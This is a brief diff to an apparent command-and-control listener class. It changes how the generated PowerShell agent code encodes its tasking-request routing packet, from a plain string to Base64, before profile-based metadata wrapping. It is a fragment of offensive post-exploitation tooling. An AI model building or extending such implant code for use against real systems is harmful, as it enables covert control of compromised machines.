@@ -768,7 +768,7 @@ class Listener(object):
                 # ==== BUILD ROUTING PACKET ====
                 # meta 'TASKING_REQUEST' : 4
                 getTask += "$RoutingPacket = New-RoutingPacket -EncData $Null -Meta 4;"
-                getTask += "$RoutingPacket = [System.Text.Encoding]::Default.GetString($RoutingPacket);"
+                getTask += "$RoutingPacket = [Convert]::ToBase64String($RoutingPacket);"
                 getTask += profile.get.client.metadata.generate_powershell("$RoutingPacket")
 
                 # ==== BUILD REQUEST ====
